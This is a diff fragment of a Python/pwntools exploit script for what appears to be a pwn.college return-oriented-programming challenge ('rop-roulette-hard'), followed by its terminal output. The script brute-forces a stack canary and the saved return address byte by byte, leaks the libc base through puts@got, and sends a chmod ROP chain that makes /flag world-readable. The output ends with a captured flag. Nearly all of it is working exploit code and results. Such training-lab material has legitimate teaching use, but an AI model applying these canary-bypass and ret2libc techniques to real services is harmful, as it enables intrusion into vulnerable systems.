@@ -14037,25 +14037,33 @@ context.log_level = 'error'
 host = 'localhost'
 port = 1337
 
+# Libc offsets
 puts_libc_off = 0x84420
 pop_rdi_off   = 0x23b6a
 pop_rsi_off   = 0x2601f
 chmod_off     = 0x10dd80
-bang_off      = 0x2a32  # "!\x00" string in libc .rodata
+bang_off      = 0x2a32    # "!\x00" string in libc
 
-ret_addr_off  = 0x1726
-pop_rdi_bin   = 0x17b3
-puts_plt_off  = 0x1154
-puts_got_off  = 0x3f60
-ret_off       = 0x101a
+# Binary offsets (PIE-relative)
+ret_addr_off  = 0x1726    # main+457 = instruction after call challenge
+pop_rdi_bin   = 0x17b3    # pop rdi ; ret
+puts_plt_off  = 0x1154    # puts@plt
+puts_got_off  = 0x3f60    # puts@got
+ret_off       = 0x101a    # ret (stack alignment)
 
 canary_off = 72
-rip_fixed  = bytes([ret_addr_off & 0xFF])
+rip_off    = 88
+
+# Byte 0 of saved RIP is fixed: binary_base & 0xFF == 0, so RET_ADDR & 0xFF
+rip_fixed = bytes([ret_addr_off & 0xFF])   # [0x26]
 
 def connect():
     return remote(host, port)
 
+# --- STAGE 1: Brute-force canary byte-by-byte ---
+# Oracle: Goodbye in output = canary intact = correct byte.
 print('[*] Stage 1: Brute-forcing canary...')
+
 known_canary = b'\x00'
 for i in range(7):
     found_byte = False
@@ -14063,7 +14071,7 @@ for i in range(7):
         try:
             p = connect()
             p.send(b'A' * canary_off + known_canary + p8(byte_guess))
-            out = p.recvall(timeout=1)
+            out = p.recvall(timeout=3)
             p.close()
             if b'Goodbye' in out:
                 known_canary += p8(byte_guess)
@@ -14073,20 +14081,30 @@ for i in range(7):
         except Exception:
             pass
     if not found_byte:
-        print(f'[!] Failed at canary byte {i+1}'); exit()
+        print(f'[!] Failed at canary byte {i+1}')
+        exit()
 
 canary = u64(known_canary)
 print(f'[*] Canary: {hex(canary)}')
 
+# --- STAGE 2: Brute-force saved RIP bytes 1–5 → binary base ---
+# read() writes exactly what we send; unwritten bytes retain their original stack
+# values. Oracle identical to Stage 1.
 print('[*] Stage 2: Brute-forcing saved RIP...')
+
 known_rip = rip_fixed
 for i in range(5):
     found_byte = False
     for byte_guess in range(256):
         try:
             p = connect()
-            p.send(flat(b'A' * canary_off, p64(canary), p64(0), known_rip + p8(byte_guess)))
-            out = p.recvall(timeout=1)
+            p.send(flat(
+                b'A' * canary_off,
+                p64(canary),
+                p64(0),
+                known_rip + p8(byte_guess),
+            ))
+            out = p.recvall(timeout=3)
             p.close()
             if b'Goodbye' in out:
                 known_rip += p8(byte_guess)
@@ -14096,11 +14114,12 @@ for i in range(5):
         except Exception:
             pass
     if not found_byte:
-        print(f'[!] Failed at RIP byte {i+1}'); exit()
+        print(f'[!] Failed at RIP byte {i+1}')
+        exit()
 
 saved_rip   = u64(known_rip + b'\x00\x00')
 binary_base = saved_rip - ret_addr_off
-assert binary_base & 0xfff == 0
+assert binary_base & 0xfff == 0, f'binary base misaligned: {hex(binary_base)}'
 print(f'[*] Binary base: {hex(binary_base)}')
 
 pop_rdi_b = binary_base + pop_rdi_bin
@@ -14108,16 +14127,25 @@ puts_plt  = binary_base + puts_plt_off
 puts_got  = binary_base + puts_got_off
 ret       = binary_base + ret_off
 
+# --- STAGE 3: Leak libc base via puts(puts@got) ---
 print('[*] Stage 3: Leaking libc base...')
+
 p = connect()
-p.send(flat(b'A' * canary_off, p64(canary), p64(0), ret, pop_rdi_b, puts_got, puts_plt))
+p.send(flat(
+    b'A' * canary_off,
+    p64(canary),
+    p64(0),
+    ret,
+    pop_rdi_b, puts_got,
+    puts_plt,
+))
 raw = p.recvall(timeout=3)
 p.close()
 
 lines       = [l for l in raw.split(b'\n') if l]
 leaked_puts = u64(lines[-1].ljust(8, b'\x00'))
 libc_base   = leaked_puts - puts_libc_off
-assert libc_base & 0xfff == 0
+assert libc_base & 0xfff == 0, f'libc base misaligned: {hex(libc_base)}'
 print(f'[*] Libc base: {hex(libc_base)}')
 
 pop_rdi = libc_base + pop_rdi_off
@@ -14125,14 +14153,47 @@ pop_rsi = libc_base + pop_rsi_off
 chmod   = libc_base + chmod_off
 bang    = libc_base + bang_off
 
+# --- STAGE 4: chmod("!", 0o777) ---
+# "!\x00" already exists at libc_base + bang_off — no stack address needed.
+# ~/! is a symlink to /flag, so chmod("!", 0o777) makes /flag world-readable.
 print('[*] Stage 4: Sending chmod chain...')
+
 p = connect()
-p.send(flat(b'A' * canary_off, p64(canary), p64(0), pop_rdi, bang, pop_rsi, 0o777, chmod))
+p.send(flat(
+    b'A' * canary_off,
+    p64(canary),
+    p64(0),
+    ret,            # stack alignment for chmod
+    pop_rdi, bang,
+    pop_rsi, 0o777,
+    chmod,
+))
 p.recvall(timeout=3)
 p.close()
 
-try:
-    print(open('/flag').read())
-except PermissionError:
-    print('[-] chmod failed')
+print(open('/flag').read())
+```
+
+```
+hacker@return-oriented-programming~rop-roulette-hard:~$ python ~/script.py
+[*] Stage 1: Brute-forcing canary...
+[+] Byte 1: 0xb5 | canary: 0x00b5
+[+] Byte 2: 0x5d | canary: 0x00b55d
+[+] Byte 3: 0xd2 | canary: 0x00b55dd2
+[+] Byte 4: 0xb9 | canary: 0x00b55dd2b9
+[+] Byte 5: 0x34 | canary: 0x00b55dd2b934
+[+] Byte 6: 0x9b | canary: 0x00b55dd2b9349b
+[+] Byte 7: 0xe1 | canary: 0x00b55dd2b9349be1
+[*] Canary: 0xe19b34b9d25db500
+[*] Stage 2: Brute-forcing saved RIP...
+[+] Byte 1: 0x67 | rip: 0x2667
+[+] Byte 2: 0x3b | rip: 0x26673b
+[+] Byte 3: 0xe3 | rip: 0x26673be3
+[+] Byte 4: 0xd7 | rip: 0x26673be3d7
+[+] Byte 5: 0x56 | rip: 0x26673be3d756
+[*] Binary base: 0x56d7e33b5000
+[*] Stage 3: Leaking libc base...
+[*] Libc base: 0x7e3331429000
+[*] Stage 4: Sending chmod chain...
+pwn.college{kj5uG0F6hVZ6lLeWqZ2FoHdKP1O.0FO2MDL4ITM0EzW}
 ```
